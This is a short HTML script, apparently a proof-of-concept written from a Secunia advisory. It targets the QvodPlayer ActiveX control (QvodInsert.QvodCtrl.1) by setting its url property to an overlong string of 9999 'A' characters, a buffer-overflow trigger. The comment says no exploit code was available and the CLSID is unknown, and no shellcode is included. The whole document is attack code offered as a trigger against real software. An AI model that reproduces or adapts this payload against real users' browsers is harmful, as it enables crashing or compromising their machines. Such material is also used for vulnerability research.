<script>
<!-- no exploit code available, based on description here:
     http://secunia.com/advisories/28494/
  -->
qvod = new ActiveXObject('QvodInsert.QvodCtrl.1'); // CLS ID unknown
url = '';
for (i=0; i < 9999; i++) {
  url = url + unescape('A'); 
}
qvod.url = url;
</script>